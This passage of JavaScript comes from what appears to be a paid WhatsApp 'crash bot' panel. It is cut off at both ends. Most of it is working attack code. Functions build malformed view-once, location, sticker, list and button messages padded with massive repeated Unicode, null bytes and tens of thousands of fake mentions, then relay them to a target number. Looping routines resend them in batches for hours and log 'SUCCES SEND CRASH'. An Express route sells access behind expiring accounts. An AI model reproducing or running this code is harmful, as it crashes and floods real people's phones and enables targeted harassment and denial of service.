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",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msg2 = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          extendMsg
        }
      }
    }, {});
    await Ren.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
    await Ren.relayMessage('status@broadcast', msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};

async function InVsSwIphone(X) {
  try {
    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "𝐒͢𝐢͡༑𝐗 ⍣᳟ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 🐉" + "𝐒͢𝐢͡༑𝐗 𖣂 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ⍣ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗͡𝐨🎭" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "𖣂 ᳟༑ᜌ ̬  .....   ͠⤻𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 ( 𖣂 ) 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ⃜    ⃟༑" + "𖣂 ᳟༑ᜌ ̬  .....   ͠⤻𝐓͜𝐑𝐀͓᪳𝐒⃪𝐇 ( 𖣂 ) 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ⃜    ⃟༑" + "𑇂𑆵𑆴𑆿".repeat(5000),
      url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }

    const msg = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: { locationMessage }
      }
    }, {});

    await Ren.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: { jid: X },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};

async function iNvsExTendIos(X) {
  try {
    const extendedTextMessage = {
      text: `𝐒͢𝐢͡༑𝐗 ⍣᳟ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 🐉 \n\n 🫀 creditos : t.me/whiletry ` + CrLxTrava + LagHomeTravas,
      matchedText: "https://t.me/whiletry",
      description: "𝐒͢𝐢͡༑𝐗 𖣂 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ⍣ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗͡𝐨🎭" + "𑇂𑆵𑆴𑆿".repeat(150),
      title: "𝐒͢𝐢͡༑𝐗 ᭯ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ☇ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗፝𝐨〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
      previewType: "NONE",
      jpegThumbnail: "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",
      thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
      thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
      thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
      mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
      mediaKeyTimestamp: "1743101489",
      thumbnailHeight: 641,
      thumbnailWidth: 640,
      inviteLinkGroupTypeV2: "DEFAULT",
      contextInfo: {
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: "",
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      }
    }

    const msg = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: { extendedTextMessage }
      }
    }, {});

    await Ren.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: { jid: X },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};

async function ViewOnceXtended(target) {
  const MSG = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "\u0007".repeat(30000),
          previewType: "ꦽ".repeat(10200),
          contextInfo: {
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  await Ren.relayMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
          content: undefined
        }
      ]
    }
  );
}

async function TrashProtocol(target, mention) {
  const sex = Array.from({ length: 9741 }, (_, r) => ({
    title: "꧀".repeat(9741),
    rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "⟅̊༑ ▾𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷 ༑ ▾",
          listType: 2,
          buttonText: null,
          sections: sex,
          singleSelectReply: { selectedRowId: "🇷🇺" },
          contextInfo: {
            mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "🇷🇺"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ren.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "⟅̊༑ ▾𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷 ༑ ▾" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function StickerMassageNew(X) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: X,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(X, message, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function DelayOld2(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "📟",
      contentText:
        "⟅ ༑ ▾𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷⟅ ༑ ▾",
      footerText: "©𝟐𝟎𝟐𝟓 RenXopown ༑",
      buttons: [
        {
          buttonId: ".bugs",
          buttonText: {
            displayText: "🇷🇺" + "\u0000".repeat(800000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  if (mention) {
    await Ren.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "⟅ ༑ ▾𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷 ༑ ▾ " },
            content: undefined,
          },
        ],
      }
    );
  }
}



async function oldDelay(X, mention = true) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷༑⃟⃟🎭",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: X,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷༑⃟⃟🎭"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(X, MSG, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ren.relayMessage(
      X,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
            content: undefined
          }
        ]
      }
    );
  }
  console.log(chalk.bold.red('SUCCES SEND CRASH'));
}

async function GetSuZoXAndros(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
          BlankPack(X),
          framersbug1(X),
          framersbug1(X),
          boegProtocol(X),
          SixDelay(X),
          SixDelay(X),
          NewBoeg(X),
          NewBoeg(X),
          boegProtocol(X),
          boegProtocol(X),
          restart(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1000 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Matrix 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function iosflood(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 1000) {
        await Promise.all([
          XiosVirus(X),
          TrashLocIOS(X),
          restart(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/1000 DELAY IOS🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade NECRO 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

//middle waree cooldown
const { cooldownMiddleware } = require ("./middleware/cooldown.js");

// 1️⃣ Render halaman UI (tanpa cooldown)
app.get("/execution", (req, res) => {
  const username = req.cookies?.sessionUser || "Anonymous";
  const users = getUsers();
  const user = users.find(u => u.username === username);
  const expired = user?.expired || null;

  res.send(
    executionPage(
      "🟪 Ready",
      {},
      true,
      { username, expired },
      "",
      ""
    )
  );
});

// 2️⃣ Endpoint eksekusi (kena cooldown)
app.get("/execution/run", cooldownMiddleware(), (req, res) => {
  const username = req.cookies?.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  const expired = currentUser?.expired || null;

  // ✅ kalau gak login
  if (!username || !currentUser) {
    return res.status(401).json({
      success: false,
      message: "Unauthorized: silakan login dulu.",
    });
  }

  // ✅ kalau akun expired
  if (!expired || Date.now() > expired) {
    return res.status(403).json({
      success: false,
      message: "Akses kadaluarsa. Silakan perpanjang akun.",
      username,
      expired,
    });
  }

  // ✅ kalau ada error cooldown
